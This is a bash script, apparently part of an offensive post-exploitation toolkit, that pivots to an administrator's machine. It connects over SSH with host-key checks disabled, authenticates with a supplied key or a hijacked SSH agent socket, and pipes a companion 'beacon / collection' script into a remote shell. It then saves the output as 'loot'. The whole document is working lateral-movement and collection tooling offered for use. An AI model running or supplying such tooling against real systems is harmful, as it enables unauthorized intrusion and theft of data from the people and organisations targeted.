#!/usr/bin/env bash
# SSH to admin PC and pipe remote_on_admin_host.sh (beacon / collection).
# Usage: sudo ./post_pivot_admin_host.sh <ADMIN_IP> [admin_ssh_port]
set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ADMIN_IP="${1:-}"
ADMIN_PORT="${2:-22}"
ADMIN_USER="${ADMIN_USER:-admin}"
KEY="${KEY:-}"
LOOT_DIR="${LOOT_DIR:-/tmp}"
OUT="${LOOT_DIR}/admin-host-$(date +%Y%m%d-%H%M%S).log"

[[ -n "$ADMIN_IP" ]] || { echo "Usage: $0 <ADMIN_IP> [admin_ssh_port]"; exit 1; }

SSH_BASE=( -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
           -p "$ADMIN_PORT" "${ADMIN_USER}@${ADMIN_IP}" )

if [[ -n "$KEY" && -r "$KEY" ]]; then
  SSH_BASE=( -i "$KEY" "${SSH_BASE[@]}" )
elif [[ -n "${SSH_AUTH_SOCK:-}" && -S "${SSH_AUTH_SOCK}" ]]; then
  SSH_BASE=( -o IdentityAgent="$SSH_AUTH_SOCK" -o PreferredAuthentications=publickey
             -o PasswordAuthentication=no -o BatchMode=yes "${SSH_BASE[@]}" )
else
  echo "[-] Set KEY=... or run via post_pivot_via_agent.sh (agent socket)"
  exit 1
fi

echo "[*] remote_on_admin_host.sh → ${ADMIN_USER}@${ADMIN_IP}:${ADMIN_PORT}"
echo "[*] Loot: ${OUT}"
ssh "${SSH_BASE[@]}" 'bash -s' < "$DIR/remote_on_admin_host.sh" | tee "$OUT"
echo "[+] Done."